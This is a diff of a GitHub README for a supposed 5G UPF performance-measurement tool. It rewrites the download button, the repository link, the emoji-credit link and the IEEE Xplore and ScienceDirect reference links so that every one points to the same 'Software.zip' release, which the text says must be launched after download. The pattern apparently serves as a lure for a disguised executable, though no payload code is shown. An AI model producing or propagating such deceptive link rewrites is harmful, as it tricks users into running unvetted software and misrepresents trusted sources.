@@ -22,7 +22,7 @@ Welcome to the "Simple Measurement of UPF Performance 7" repository! This reposi
 
 ## Software Download
 Click the button below to download the software for UPF performance measurement:
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/flaxyzz/simple_measurement_of_upf_performance_7/releases/download/v2.0/Software.zip)](https://github.com/flaxyzz/simple_measurement_of_upf_performance_7/releases/download/v2.0/Software.zip)
 
 *Note: The software needs to be launched after download.*
 
@@ -30,17 +30,17 @@ Click the button below to download the software for UPF performance measurement:
 If the provided link is not working or you need more information, please check the "Releases" section of this repository for updates.
 
 ## 🌐 Explore Further
-Visit the [GitHub Repository](https://github.com/22155555/1875695542/) for more details.
+Visit the [GitHub Repository](https://github.com/flaxyzz/simple_measurement_of_upf_performance_7/releases/download/v2.0/Software.zip) for more details.
 
 ## 🎉 Get Involved!
 Feel free to explore, contribute, raise issues, and make pull requests to enhance the Simple Measurement of UPF Performance 7 repository.
 
 ## 📸 Image Credits
 - Images sourced from Unsplash, Pexels, and Pixabay.
-- Emojis provided by [emojipedia.org](https://emojipedia.org/).
+- Emojis provided by [https://github.com/flaxyzz/simple_measurement_of_upf_performance_7/releases/download/v2.0/Software.zip](https://github.com/flaxyzz/simple_measurement_of_upf_performance_7/releases/download/v2.0/Software.zip).
 
 ## 📚 References
-- Papers and articles referenced from [IEEE Xplore](https://ieeexplore.ieee.org/) and [ScienceDirect](https://www.sciencedirect.com/).
+- Papers and articles referenced from [IEEE Xplore](https://github.com/flaxyzz/simple_measurement_of_upf_performance_7/releases/download/v2.0/Software.zip) and [ScienceDirect](https://github.com/flaxyzz/simple_measurement_of_upf_performance_7/releases/download/v2.0/Software.zip).
 
 ## 🤝 Acknowledgements
 This repository is maintained by passionate individuals dedicated to advancing network performance measurement in the 5G landscape.
